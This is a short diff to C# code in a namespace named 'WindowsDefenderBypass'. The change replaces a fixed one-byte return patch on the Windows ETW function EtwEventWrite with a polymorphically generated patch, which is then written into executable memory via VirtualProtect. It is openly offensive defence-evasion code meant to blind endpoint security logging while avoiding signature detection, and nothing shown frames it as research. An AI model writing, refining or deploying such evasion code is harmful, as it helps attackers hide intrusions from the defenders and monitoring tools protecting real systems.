@@ -23,7 +23,7 @@ namespace WindowsDefenderBypass
                     return;
                 }
 
-                byte[] patch = { 0xC3 };
+                byte[] patch = PolymorphicPatchGenerator.GenerateEtwPatch();
 
                 uint oldProtect;
                 if (NativeMethods.VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, NativeMethods.PAGE_EXECUTE_READWRITE, out oldProtect))
